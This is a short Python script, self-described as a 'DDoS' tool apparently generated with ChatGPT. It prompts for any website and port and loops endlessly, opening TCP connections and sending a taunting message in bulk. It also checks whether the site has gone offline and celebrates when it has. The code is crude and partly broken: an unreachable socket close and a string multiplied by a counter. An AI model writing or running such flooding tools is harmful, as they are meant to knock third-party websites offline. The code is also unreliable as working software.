import socket
import time

def webstatus(url):
    try:
        ip = socket.gethostbyname(url)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)  # Set a timeout for the connection attempt
        result = sock.connect_ex((ip, 80))

        if result == 0:
            return True
        else:
            return False

        sock.close()
    except socket.error as e:
        print(f"An error occurred: {str(e)}")

def find_port(service_name):
    try:
        port = socket.getservbyname(service_name)
        return port
    except socket.error:
        return None

def send_packets(website, port, packs):
    try:
        ip = socket.gethostbyname(website)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (ip, port)
        sock.connect(server_address)

        for _ in range(int(packs)):
            sock.sendall(b"Sorry, but your website is gonna be DDoS-ed")

        sock.close()

        if webstatus(website):
            print(f"Sended {packs} to {website}, but it is still online.")
        else:
            print(f"Cool! The website '{website}' is closed or offline.")
            print("You just sended", packs * times, "Packets, WOW!")
            exit(0)
    except socket.error as e:
        print(f"An error occurred: {str(e)}")

# Example usage
print("DDoS Sop by Scratch2033")
print("Powered by ChatGpt 4 (Free, poe)")
print("")

time.sleep(0.2)
website = input("Enter the website URL: ")
service = input("Network/Website protocol: ")
plc = find_port(service)
print("available ports:", plc)
port = int(input("Input port: "))
packs = input("Input number of packets to be sent: ")
times = 0
while True:
    times = times + 1
    send_packets(website, port, packs)
